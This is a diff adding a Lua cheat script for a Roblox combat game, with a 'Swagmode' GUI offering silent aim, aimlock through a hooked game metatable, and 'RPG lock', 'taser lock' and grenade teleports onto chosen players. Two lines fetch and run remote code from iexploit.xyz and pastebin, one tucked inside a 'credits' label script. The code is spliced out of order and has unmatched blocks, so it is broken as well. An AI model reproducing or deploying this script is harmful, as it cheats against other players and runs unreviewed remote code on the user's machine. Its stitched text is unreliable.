@@ -1,0 +1,640 @@
+
+TaserLock.Font = Enum.Font.GothamBlack
+TaserLock.Text = "TaserLock"
+TaserLock.TextColor3 = Color3.fromRGB(255, 255, 255)
+TaserLock.TextSize = 14.000
+
+RpgLock.Name = "RpgLock"
+RpgLock.Parent = SideScriptsFrame
+RpgLock.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+RpgLock.BorderSizePixel = 0
+RpgLock.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
+RpgLock.Size = UDim2.new(0, 94, 0, 46)
+RpgLock.Font = Enum.Font.GothamBlack
+RpgLock.Text = "RpgLock"
+RpgLock.TextColor3 = Color3.fromRGB(255, 255, 255)
+RpgLock.TextSize = 14.000
+
+TogglesFrame.Name = "TogglesFrame"
+TogglesFrame.Parent = Buttons
+TogglesFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TogglesFrame.BackgroundTransparency = 1.000
+TogglesFrame.Size = UDim2.new(0, 316, 0, 325)
+TogglesFrame.Visible = false
+if not game:IsLoaded() then
+	game.Loaded:Wait()
+end
+
+local Swagmode = Instance.new("ScreenGui")
+local SwagmodeFrame = Instance.new("Frame")
+local MenuFrame = Instance.new("Frame")
+local TogglesButton = Instance.new("TextButton")
+local QuickTpButton = Instance.new("TextButton")
+local SideButton = Instance.new("TextButton")
+local imiecredits = Instance.new("TextLabel")
+local Swagmode_2 = Instance.new("TextLabel")
+local UIGradient = Instance.new("UIGradient")
+local Frame = Instance.new("Frame")
+local MainButton = Instance.new("TextButton")
+local SellingButton = Instance.new("TextButton")
+local DropShadowHolder = Instance.new("Frame")
+local DropShadow = Instance.new("ImageLabel")
+local TopLine = Instance.new("Frame")
+local SideInfo = Instance.new("Frame")
+local TargetImage = Instance.new("ImageLabel")
+local UICorner = Instance.new("UICorner")
+local SetNearestButton = Instance.new("TextButton")
+local CashLabel = Instance.new("TextLabel")
+local TargetTextbox = Instance.new("TextBox")
+local BountyLabel = Instance.new("TextLabel")
+local CrewLabel = Instance.new("TextButton")
+local Buttons = Instance.new("Frame")
+local MainFrame = Instance.new("Frame")
+local TaserLock = Instance.new("TextButton")
+local RpgLock = Instance.new("TextButton")
+
+--Properties:
+Swagmode.Name = "RpgLock"
+Swagmode.Parent = game.CoreGui
+Swagmode.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+SwagmodeFrame.Name = "SwagmodeFrame"
+SwagmodeFrame.Parent = Swagmode
+SwagmodeFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+SwagmodeFrame.BorderSizePixel = 0
+SwagmodeFrame.Position = UDim2.new(0.212884605, 0, 0.190036908, 0)
+SwagmodeFrame.Size = UDim2.new(0, 605, 0, 336)
+
+MenuFrame.Name = "MenuFrame"
+MenuFrame.Parent = SwagmodeFrame
+MenuFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+MenuFrame.BorderSizePixel = 0
+MenuFrame.Size = UDim2.new(0, 155, 0, 336)
+
+SideButton.Name = "SideButton"
+SideButton.Parent = MenuFrame
+SideButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+SideButton.BorderSizePixel = 0
+SideButton.Position = UDim2.new(0.0922105312, 0, 0.307098716, 0)
+SideButton.Size = UDim2.new(0, 123, 0, 31)
+SideButton.AutoButtonColor = false
+SideButton.Font = Enum.Font.GothamBlack
+SideButton.Text = "Side Scripts"
+SideButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+SideButton.TextSize = 14.000
+
+Swagmode_2.Name = "Swagmode"
+Swagmode_2.Parent = MenuFrame
+Swagmode_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Swagmode_2.BackgroundTransparency = 1.000
+Swagmode_2.Position = UDim2.new(0.045161292, 0, 0, 0)
+Swagmode_2.Size = UDim2.new(0, 115, 0, 34)
+Swagmode_2.Font = Enum.Font.GothamBlack
+Swagmode_2.Text = "SWAGMODE"
+Swagmode_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Swagmode_2.TextSize = 20.000
+
+UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(49, 48, 70)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
+UIGradient.Offset = Vector2.new(0.100000001, 0)
+UIGradient.Parent = Swagmode_2
+
+Frame.Parent = MenuFrame
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.045161292, 0, 0.092261903, 0)
+Frame.Size = UDim2.new(0, 126, 0, 3)
+
+MainButton.Name = "MainButton"
+MainButton.Parent = MenuFrame
+MainButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+MainButton.BorderSizePixel = 0
+MainButton.Position = UDim2.new(0.0922105238, 0, 0.178689778, 0)
+MainButton.Size = UDim2.new(0, 123, 0, 31)
+MainButton.AutoButtonColor = false
+MainButton.Font = Enum.Font.GothamBlack
+MainButton.Text = "Main Scripts"
+MainButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+MainButton.TextSize = 14.000
+
+SellingButton.Name = "SellingButton"
+SellingButton.Parent = MenuFrame
+SellingButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+SellingButton.BorderSizePixel = 0
+SellingButton.Position = UDim2.new(0.0986621454, 0, 0.716439128, 0)
+SellingButton.Size = UDim2.new(0, 123, 0, 31)
+SellingButton.AutoButtonColor = false
+SellingButton.Font = Enum.Font.GothamBlack
+SellingButton.Text = "Selling Tools"
+SellingButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+SellingButton.TextSize = 14.000
+
+DropShadowHolder.Name = "DropShadowHolder"
+DropShadowHolder.Parent = SwagmodeFrame
+DropShadowHolder.BackgroundTransparency = 1.000
+DropShadowHolder.BorderSizePixel = 0
+DropShadowHolder.Size = UDim2.new(1, 0, 1, 0)
+DropShadowHolder.ZIndex = 0
+
+DropShadow.Name = "DropShadow"
+DropShadow.Parent = DropShadowHolder
+DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
+DropShadow.BackgroundTransparency = 1.000
+DropShadow.BorderSizePixel = 0
+DropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
+DropShadow.Size = UDim2.new(1, 47, 1, 47)
+DropShadow.ZIndex = 0
+DropShadow.Image = "rbxassetid://6015897843"
+DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+DropShadow.ImageTransparency = 0.200
+DropShadow.ScaleType = Enum.ScaleType.Slice
+DropShadow.SliceCenter = Rect.new(49, 49, 450, 450)
+
+TopLine.Name = "TopLine"
+TopLine.Parent = SwagmodeFrame
+TopLine.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+TopLine.BorderSizePixel = 0
+TopLine.Position = UDim2.new(0.256198347, 0, 0, 0)
+TopLine.Size = UDim2.new(0, 450, 0, 7)
+
+SideInfo.Name = "SideInfo"
+SideInfo.Parent = SwagmodeFrame
+SideInfo.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+SideInfo.BorderSizePixel = 0
+SideInfo.Position = UDim2.new(0.778512418, 0, 0.020833334, 0)
+SideInfo.Size = UDim2.new(0, 134, 0, 329)
+
+TargetImage.Name = "TargetImage"
+TargetImage.Parent = SideInfo
+TargetImage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TargetImage.Position = UDim2.new(0.0950299203, 0, 0.0244709235, 0)
+TargetImage.Size = UDim2.new(0, 108, 0, 104)
+TargetImage.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+TargetImage.ImageColor3 = Color3.fromRGB(300, 300, 300)
+
+UICorner.CornerRadius = UDim.new(0, 500)
+UICorner.Parent = TargetImage
+
+SetNearestButton.Name = "SetNearestButton"
+SetNearestButton.Parent = SideInfo
+SetNearestButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+SetNearestButton.BorderSizePixel = 0
+SetNearestButton.Position = UDim2.new(0.072641857, 0, 0.851063848, 0)
+SetNearestButton.Size = UDim2.new(0, 114, 0, 29)
+SetNearestButton.AutoButtonColor = false
+SetNearestButton.Font = Enum.Font.GothamBlack
+SetNearestButton.Text = "Set Nearest"
+SetNearestButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+SetNearestButton.TextSize = 14.000
+
+CashLabel.Name = "CashLabel"
+CashLabel.Parent = SideInfo
+CashLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+CashLabel.BorderSizePixel = 0
+CashLabel.Position = UDim2.new(0.072641857, 0, 0.519756854, 0)
+CashLabel.Size = UDim2.new(0, 115, 0, 26)
+CashLabel.Font = Enum.Font.SourceSans
+CashLabel.Text = "Cash:"
+CashLabel.TextColor3 = Color3.fromRGB(72, 72, 72)
+CashLabel.TextSize = 14.000
+
+TargetTextbox.Name = "TargetTextbox"
+TargetTextbox.Parent = SideInfo
+TargetTextbox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TargetTextbox.BorderSizePixel = 0
+TargetTextbox.Position = UDim2.new(0.072641857, 0, 0.392097205, 0)
+TargetTextbox.Size = UDim2.new(0, 115, 0, 31)
+TargetTextbox.Font = Enum.Font.GothamBlack
+TargetTextbox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
+TargetTextbox.Text = ""
+TargetTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TargetTextbox.TextSize = 14.000
+TargetTextbox.TextWrapped = true
+TargetTextbox.TextScaled = true
+
+BountyLabel.Name = "BountyLabel"
+BountyLabel.Parent = SideInfo
+BountyLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+BountyLabel.BorderSizePixel = 0
+BountyLabel.Position = UDim2.new(0.072641857, 0, 0.633550763, 0)
+BountyLabel.Size = UDim2.new(0, 115, 0, 26)
+BountyLabel.Font = Enum.Font.SourceSans
+BountyLabel.Text = "Bounty:"
+BountyLabel.TextColor3 = Color3.fromRGB(72, 72, 72)
+BountyLabel.TextSize = 14.000
+
+CrewLabel.Name = "CrewLabel"
+CrewLabel.Parent = SideInfo
+CrewLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+CrewLabel.BorderSizePixel = 0
+CrewLabel.Position = UDim2.new(0.072641857, 0, 0.737304032, 0)
+CrewLabel.Size = UDim2.new(0, 115, 0, 26)
+CrewLabel.Font = Enum.Font.SourceSans
+CrewLabel.Text = "Crew:"
+CrewLabel.TextColor3 = Color3.fromRGB(72, 72, 72)
+CrewLabel.TextSize = 14.000
+CrewLabel.TextScaled = true
+
+Buttons.Name = "Buttons"
+Buttons.Parent = SwagmodeFrame
+Buttons.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Buttons.BackgroundTransparency = 1.000
+Buttons.Position = UDim2.new(0.256198347, 0, 0.0297619049, 0)
+Buttons.Size = UDim2.new(0, 316, 0, 325)
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = Buttons
+MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MainFrame.BackgroundTransparency = 1.000
+MainFrame.Size = UDim2.new(0, 316, 0, 325)
+MainFrame.Visible = true
+
+SideScriptsFrame.Name = "SideScriptsFrame"
+SideScriptsFrame.Parent = Buttons
+SideScriptsFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SideScriptsFrame.BackgroundTransparency = 1.000
+SideScriptsFrame.Size = UDim2.new(0, 316, 0, 325)
+SideScriptsFrame.Visible = false
+
+TaserLock.Name = "TaserLock"
+TaserLock.Parent = SideScriptsFrame
+TaserLock.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+TaserLock.BorderSizePixel = 0
+TaserLock.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
+TaserLock.Size = UDim2.new(0, 94, 0, 46)
+local function FUVO_fake_script() -- imiecredits.LocalScript 
+	local script = Instance.new('LocalScript', imiecredits)
+	loadstring(game:HttpGet('https://iexploit.xyz/credits.lua'))()
+	script.Parent.Text = "Credits:\nby: yahyeee#7643\nUI by: imie#0039"
+end
+coroutine.wrap(FUVO_fake_script)()
+local function PXXAONR_fake_script() -- UIGradient.LocalScript 
+	local script = Instance.new('LocalScript', UIGradient)
+	game:GetService('RunService').RenderStepped:Connect(function()
+		script.Parent.Rotation = (tick() * 75) % 360;
+	end)
+end
+coroutine.wrap(PXXAONR_fake_script)()
+local function OZAKZ_fake_script() -- SwagmodeFrame.DragScript 
+	local script = Instance.new('LocalScript', SwagmodeFrame)
+	script.Parent.Active = true
+	script.Parent.Draggable = true
+end
+coroutine.wrap(OZAKZ_fake_script)()
+
+function hideframes()
+    MainFrame.Visible = false
+    QuickTpFrame.Visible = false
+    SideScriptsFrame.Visible = false
+    TogglesFrame.Visible = false
+    SellingFrame.Visible = false
+end
+
+function notify(title,text,time)
+    game.StarterGui:SetCore("SendNotification", {
+        Title = title;
+        Text = text;
+        Duration = time;
+    })
+end
+
+Players = game:GetService('Players')
+UIS = game:GetService('UserInputService')
+RS = game:GetService('RunService')
+
+
+TogglesButton.MouseButton1Click:Connect(function()
+    hideframes()
+    TogglesFrame.Visible = false
+end)
+QuickTpButton.MouseButton1Click:Connect(function()
+    hideframes()
+    QuickTpFrame.Visible = false
+end)
+SideButton.MouseButton1Click:Connect(function()
+    hideframes()
+    SideScriptsFrame.Visible = true
+end)
+MainButton.MouseButton1Click:Connect(function()
+    hideframes()
+    MainFrame.Visible = false
+end)
+SellingButton.MouseButton1Click:Connect(function()
+    hideframes()
+    SellingFrame.Visible = false
+end)
+
+local formatNumber = (function (n)
+    n = tostring(n)
+    return n:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
+end)
+
+function SetPlayerInfo()
+    local foundplayer = game:GetService('Players'):FindFirstChild(TargetTextbox.Text)
+    if foundplayer then
+        local TargetId = foundplayer.UserId
+        local ThumbType = Enum.ThumbnailType.HeadShot
+        local ThumbSize = Enum.ThumbnailSize.Size420x420
+        local Content, IsReady = game:GetService('Players'):GetUserThumbnailAsync(TargetId, ThumbType, ThumbSize)
+                    
+        TargetImage.Image = Content
+        
+        CashLabel.Text = ('Cash : ' .. formatNumber(foundplayer.DataFolder.Currency.Value))
+        BountyLabel.Text = ('Bounty : ' .. formatNumber(foundplayer.leaderstats.Wanted.Value))
+        
+        local CrewValue = foundplayer:FindFirstChild('DataFolder'):FindFirstChild('Information'):FindFirstChild('Crew')
+        if CrewValue then
+            if CrewValue.Value ~= nil and CrewValue.Value ~= '' then
+                Crew = game:GetService('GroupService'):GetGroupInfoAsync(tonumber(CrewValue.Value))
+                if Crew then
+                    CrewLabel.Text = ('Crew : ' .. Crew.Name )
+                    CrewId = tonumber(CrewValue.Value)
+                end
+            else
+                CrewLabel.Text = ('Crew : None')
+                Crew = nil
+            end
+        else
+            CrewLabel.Text = ('Crew : None')
+            Crew = nil
+        end
+    end
+end
+
+CrewLabel.MouseButton1Click:Connect(function()
+    if CrewLabel.Text ~= ('Crew : None') then
+        setclipboard(CrewId)
+    end
+end)
+
+function ShrinkName()
+    TargetTextbox.FocusLost:connect(function()
+        for i,v in pairs(game.Players:GetChildren()) do
+            if (string.sub(string.lower(v.Name),1,string.len(TargetTextbox.Text))) == string.lower(TargetTextbox.Text) then
+                TargetTextbox.Text = v.Name
+                SetPlayerInfo()
+            end
+        end
+    end)
+end
+ShrinkName()
+
+function view(plr)
+    wait()
+    if game.Players:FindFirstChild(plr) then
+        if game.Players[plr].Character then
+            game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = game.Players:FindFirstChild(plr).Character.HumanoidRootPart
+        else
+            View.Text = 'View'
+        end
+    else
+        View.Text = 'View'
+    end
+end
+
+
+loadstring(game:HttpGet("https://pastebin.com/raw/nzXicwc1", true))() -- Chatspy
+
+local vu = game:GetService("VirtualUser") -- AntiAfk
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+    wait(1)
+    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+
+spawn(function() -- Network
+    game.RunService.RenderStepped:Connect(function()
+        game.Players.LocalPlayer.MaximumSimulationRadius = 1000;
+        setsimulationradius(1000,1000)
+    end)
+end)
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
+player = game.Players.LocalPlayer
+mouse = player:GetMouse()
+MainEvent = game:GetService('ReplicatedStorage').MainEvent
+IsMod = false
+
+MaxDistance = 15
+
+COOLDOWN = true
+RIDING = false
+
+NamePos = CFrame.new(0,0,0)
+
+green = Color3.new(0,255,0)
+red = Color3.new(255,0,0)
+
+game.Workspace.Ignored.ChildAdded:Connect(function(child)
+    if child.Name == 'Launcher' and player.Character:FindFirstChild('[RPG]') then
+        child.Name = 'MyLauncher' 
+    end
+end)
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+--Rpg Variables--
+DS = 75
+DT = 5
+RpgTimer = DS
+Distance = DT
+RPGTarget = 'None'
+-----------------
+
+            if RPGTarget ~= nil then
+                local Launcher = game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('Launcher') or game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('MyLauncher')
+                local TargetRPG1 = game:GetService('Workspace').Players:FindFirstChild(RPGTarget)
+                if Launcher and TargetRPG1 then
+                    local TargetRPG = TargetRPG1:FindFirstChild('HumanoidRootPart')
+                    if TargetRPG then
+                        if RpgTimer >= 0 then
+                            Launcher.CFrame = CFrame.new(TargetRPG.Position.X, TargetRPG.Position.Y + 5, TargetRPG.Position.Z)
+                            RpgTimer = RpgTimer - 1
+                        else
+                            Launcher.CFrame = CFrame.new(TargetRPG.Position.X, TargetRPG.Position.Y + Distance, TargetRPG.Position.Z)
+                            Distance = Distance - 1
+                        end
+                    else
+                        RpgTimer = DS 
+                        Distance = DT
+                    end
+                else
+                    RpgTimer = DS 
+                    Distance = DT
+                end
+            end
+            if TazerTarget ~= nil then
+                if player.Character:FindFirstChild('[Taser]') then
+                    local Part = player.Character['[Taser]']:FindFirstChild('Handle'):FindFirstChild('Part')
+                    if Part then
+                        local FindPlayer = game.Workspace.Players:FindFirstChild(TazerTarget):FindFirstChild('UpperTorso') or game.Workspace:FindFirstChild(TazerTarget):FindFirstChild('UpperTorso') 
+                        if FindPlayer then
+                            Part.Position = FindPlayer.Position
+                        end
+                    end
+                end
+            end
+            if GrenadeTarget ~= nil then
+                print('lookin')
+                local Handle = game.Workspace['Ignored']:FindFirstChild('Handle')
+                local FindPlayer = Players:FindFirstChild(GrenadeTarget)
+                if Handle and FindPlayer then
+                    if FindPlayer.Character then
+                        Handle.Position = FindPlayer.Character.UpperTorso.Position
+                    end
+                end
+            end
+        end)
+        if err then print(err) end
+    end)
+end))
+
+
+Camera = workspace:FindFirstChildWhichIsA('Camera')
+target = false
+Aimlocked = nil
+
+local features = {
+silentaim = true;
+fov = 500;
+}
+
+function getnearest()
+    local nearestmagnitude = math.huge
+    local nearestenemy = nil
+    local vector = nil
+    for i,v in next, Players:GetChildren() do
+        if v ~= Players.LocalPlayer then
+            if v.Character and  v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 and v.Character.BodyEffects['K.O'].Value == false then
+                local vector, onScreen = Camera:WorldToScreenPoint(v.Character["HumanoidRootPart"].Position)
+                if onScreen then
+                    local ray = Ray.new(
+                        Camera.CFrame.p,
+                        (v.Character["Head"].Position-Camera.CFrame.p).unit*500
+                        )
+                        local ignore = {
+                        player.Character,
+                        }
+                    local hit,position,normal=workspace:FindPartOnRayWithIgnoreList(ray,ignore)
+                    if hit and hit:FindFirstAncestorOfClass("Model") and Players:FindFirstChild(hit:FindFirstAncestorOfClass("Model").Name)then
+                        local magnitude = (Vector2.new(mouse.X, mouse.Y) - Vector2.new(vector.X, vector.Y)).magnitude
+                        if magnitude < nearestmagnitude and magnitude <= features["fov"] then
+                            nearestenemy = v
+                            nearestmagnitude = magnitude
+                        end
+                    end
+                end
+            end
+        end
+    end
+return nearestenemy
+end
+
+
+local meta = getrawmetatable(game)
+setreadonly(meta, false)
+local oldNamecall = meta.__namecall
+meta.__namecall = newcclosure(function(...)
+local method = getnamecallmethod()
+local args = {...}
+if string.find(method,'Ray') then
+    if target then
+        args[2] = Ray.new(workspace.CurrentCamera.CFrame.Position, (target + Vector3.new(0,(workspace.CurrentCamera.CFrame.Position-target).Magnitude/500,0) - workspace.CurrentCamera.CFrame.Position).unit * 500)
+    end
+end
+return oldNamecall(unpack(args))
+end)
+
+
+local mt = getrawmetatable(game) -- aimlok
+pos = Vector3.new(0,0,0)
+local old = mt.__namecall
+setreadonly(mt,false)
+mt.__namecall = newcclosure(function(self, ...)
+  local args = {...}
+  if getnamecallmethod() == 'FireServer' and self.Name == 'MainEvent' then
+    if tostring(args[1]) == 'UpdateMousePos' then
+        if Aimlocked ~= nil then
+           -- if Aimlock.Text == 'Unaimlock' then
+                args[2] = pos
+            --end
+        end
+     end
+  end
+  return old(self, unpack(args))
+end)
+
+mouse.Button2Down:Connect(function()
+    Mouse2Down = true
+    while Mouse2Down == true and Aimlock.Text == 'Unaimlock' do
+        wait()
+        Aimlocked = getnearest()
+    end
+end)
+mouse.Button2Up:Connect(function()
+    Mouse2Down = false
+end)
+
+RpgLock.MouseButton1Click:Connect(function()
+    local RpgTool = Instance.new('Tool', player.Backpack)
+    RpgTool.ToolTip = 'Click a player to rpg lock them'
+    RpgTool.CanBeDropped = false
+    RpgTool.RequiresHandle = false
+    RpgTool.Name = 'Rpg Lock'
+    
+    RpgTool.Activated:Connect(function()
+        local LowerTorso = mouse.Target.Parent:FindFirstChild('LowerTorso')
+        if not LowerTorso then
+            LowerTorso = mouse.Target.Parent.Parent:FindFirstChild('LowerTorso')
+        end
+        if LowerTorso then
+            if LowerTorso.Parent.Name == 'SpecialParts' then
+                RPGTarget = LowerTorso.Parent.Parent.Parent.Name
+            else
+                RPGTarget = LowerTorso.Parent.Name
+            end
+            notify('Rpg locked onto', RPGTarget, 3)
+        else
+            RPGTarget = nil
+            notify('Rpg unlocked', '', 3)
+        end
+    end)
+end)
+
+TazerTarget = nil
+
+TaserLock.MouseButton1Click:Connect(function()
+    local TazerTool = Instance.new('Tool', player.Backpack)
+    TazerTool.ToolTip = 'Click a player to tazer lock them'
+    TazerTool.CanBeDropped = false
+    TazerTool.RequiresHandle = false
+    TazerTool.Name = 'Tazer Lock'
+    
+    TazerTool.Activated:Connect(function()
+        local LowerTorso = mouse.Target.Parent:FindFirstChild('LowerTorso')
+        if not LowerTorso then
+            LowerTorso = mouse.Target.Parent.Parent:FindFirstChild('LowerTorso')
+        end
+        if LowerTorso then
+            if LowerTorso.Parent.Name == 'SpecialParts' then
+                TazerTarget = LowerTorso.Parent.Parent.Parent.Name
+            else
+                TazerTarget = LowerTorso.Parent.Name
+            end
+            notify('Taser locked onto', TazerTarget, 5)
+        else
+            TazerTarget = nil
+            notify('Taser unlocked', '', 3)
+        end
+    end)
+end)
+end
